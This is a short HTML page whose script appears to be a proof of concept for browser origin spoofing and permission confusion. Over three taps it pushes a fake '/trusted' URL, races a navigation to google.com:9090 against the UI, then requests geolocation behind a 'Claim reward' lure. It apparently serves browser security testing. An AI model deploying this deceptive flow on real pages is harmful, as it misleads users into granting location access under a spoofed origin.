<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body {
    margin:0;
    height:100vh;
    background:#111;
    color:#fff;
    overflow:hidden;
    user-select:none;
    font-family:sans-serif;
  }

  #redBox {
    position:absolute;
    top:12px;
    right:20px;
    width:36px;
    height:36px;
    background:red;
    border-radius:6px;
  }

  #counter {
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    font-size:26px;
    text-align:center;
  }
</style>
</head>

<body>

<div id="redBox"></div>
<div id="counter">Tap the red box 3×</div>

<script>
let clicks = 0;

const box = document.getElementById("redBox");
const counter = document.getElementById("counter");

box.onclick = () => {
  clicks++;
  counter.textContent = "x" + clicks;

  // 1️⃣ Fake trust / state change
  if (clicks === 1) {
    history.pushState({}, "", "/trusted");
    counter.textContent = "Nice! Keep tapping…";
  }

  // 2️⃣ UI + navigation race
  if (clicks === 2) {
    counter.textContent = "Almost there…";

    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        setTimeout(() => {
          // 🔥 External-looking navigation
          location.href = "https://google.com:9090";
        }, 70);
      });
    });
  }

  // 3️⃣ Sensitive API call (context confusion)
  if (clicks === 3) {
    counter.textContent = "Claim reward 🎁";

    // Permission UI (iOS friendly)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => counter.textContent =
          "Location: " + pos.coords.latitude,
        () => counter.textContent = "Permission denied"
      );
    }
  }
};
</script>

</body>
</html>
